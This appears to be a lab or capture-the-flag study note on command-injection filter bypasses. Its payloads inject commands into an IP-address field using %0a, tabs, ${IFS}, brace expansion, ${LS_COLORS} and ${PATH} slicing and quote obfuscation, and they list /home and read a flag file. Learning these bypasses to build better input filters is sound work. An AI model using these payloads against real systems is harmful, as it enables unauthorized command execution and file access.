# New-line (\n)

New-line (%0a) is not usually a blacklisted character

<img width="1448" height="540" alt="image" src="https://github.com/user-attachments/assets/ef2d55f4-4595-46e7-9374-6aef33fb2877" />

# Using Tabs (%09)

Using tabs (%09) instead of spaces is a technique that may work, as both Linux and Windows accept commands with tabs between arguments, and they are executed the same. So, let us try to use a tab instead of the space character (127.0.0.1%0a%09) and see if our request is accepted:

# Using $IFS (expands to a space)

127.0.0.1%0a${IFS}

# Using Brace Expansion {ls,-la}

127.0.0.1%0a{ls,-la}

# Bypassing Blacklist Characters 

## Use LS_COLORS Linux environment variable

These are the LS_COLORS

<img width="1009" height="188" alt="image" src="https://github.com/user-attachments/assets/7c0ffa6a-52f9-41a4-892b-296b543d9a45" />


${LS_COLORS:10:1} → turns into ; <br>
:10:1 → “take 1 character starting at position 10”

## Use ${PATH}

<img width="1208" height="176" alt="image" src="https://github.com/user-attachments/assets/58ee94cd-1215-4d62-ae14-10b3d66f3399" />


### Find the user name in /home
```
ip=127.0.0.1${LS_COLORS:10:1}%0a{ls,-la}${IFS}${PATH:0:1}home

```
<img width="1450" height="537" alt="image" src="https://github.com/user-attachments/assets/84ce19b6-48ab-4562-8a9b-46790c90522f" />

### Read the flag.txt file under /home

<img width="1454" height="526" alt="image" src="https://github.com/user-attachments/assets/bc8194cb-fd92-4279-adb7-91e1ead75947" />

```
127.0.0.1${LS_COLORS:10:1}%0ac"at"${IFS}${PATH:0:1}home

c"at" -> cat

Deobfuscate

127.0.0.1 ; 
cat /home

```












